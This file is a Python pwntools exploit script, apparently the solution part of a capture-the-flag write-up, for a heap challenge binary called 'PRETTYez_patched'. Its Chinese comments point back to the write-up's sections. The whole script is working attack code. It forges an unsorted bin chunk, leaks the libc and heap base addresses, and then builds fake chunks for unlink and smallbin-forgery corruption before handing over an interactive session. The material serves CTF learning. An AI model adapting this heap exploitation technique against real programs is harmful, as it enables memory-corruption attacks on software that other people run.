#!/usr/bin/python3

from pwn import *

exe = ELF('PRETTYez_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        set resolve-heap-via-heuristic force
        # brva 0x1305
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)


def add(size, content):
        p.sendlineafter(b"> ", b"1")
        p.sendlineafter(b"SIZE", str(size))
        p.sendafter(b"INPUT:", content)
    
def add2(size_content, content):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"SIZE", size_content)
    p.sendafter(b"INPUT:", content)

def show():
    p.sendlineafter(b"> ", b"2")

def show2(len):
    p.sendlineafter(b"> ", b"0" * (len - 1) + b"2")

def show3(len):
    p.sendlineafter(b"> ", b"0" * (len - 1) + b"2" + b"\x00")

def free():
    p.sendlineafter(b"> ", b"3")

def free3(len):
    p.sendlineafter(b"> ", b"0" * (len - 1) + b"3")

free3(0xd59)  # 这一行的作用见上文【伪造Unsorted bin】

# 这一部分信息收集见上文【信息收集】
add(1, b"a" * 0x48 + p64(0xd11))
show2(0x1000)
free()
add(1, b"a" * 0x50)
show()
p.recvuntil(b"Content: " + b"a" * 0x50)
libc_base = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x219ce0
log.success((f"libc_base : {libc_base:#x}"))
free()
add(1, b"a" * 0x48 + p64(0xcf1))

free()
add(2, b"a")
free()
add(1, b"aaaa")
free()
add(2, b"aaaa")
free()
add(1, b"a" * 0x50)
show()
p.recvuntil(b"Content: " + b"a" * 0x50)
heap_base = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) << 12
log.success((f"heap_base : {heap_base:#x}"))
free()
GDB()
# 见上文【Unlink攻击以及Smallbin伪造攻击实施】
add(1, b"a" * 0x10 + p64(0) + p64(0x31) + p64(heap_base + 0x2c0) * 2 + b"a" * 0x10 + p64(0x30) + p64(0xd00))
free()
add(2, b"a" * 0x60 + p64(0xa0) + p64(0x10) + p64(0x00) + p64(0x11))
free()
add(1, flat({
    0x10: 0,
    0x18: 0xa1,
    0x20: heap_base + 0x390,
    0x28: libc_base + 0x219ce0,
}, filler=b"\x00"))

show2(0x1000)
free()

add(1, flat({
    0x10: {
        0x00: 0,
        0x08: 0xa1,
        0x10: heap_base + 0x2c0,
        0x18: heap_base + 0x2c0 + 0x30,
        
        0x30: 0,
        0x38: 0xa1,
        0x40: heap_base + 0x2c0,
        0x48: heap_base + 0x2c0 + 0x50,
        
        0x50: 0,
        0x58: 0xa1,
        0x60: heap_base + 0x2c0 + 0x30,
        0x68: libc_base + 0x219d70
    }
}
    , filler=b"\x00"))
# free()
# add(2, b"aaaa")
# free()

p.interactive()
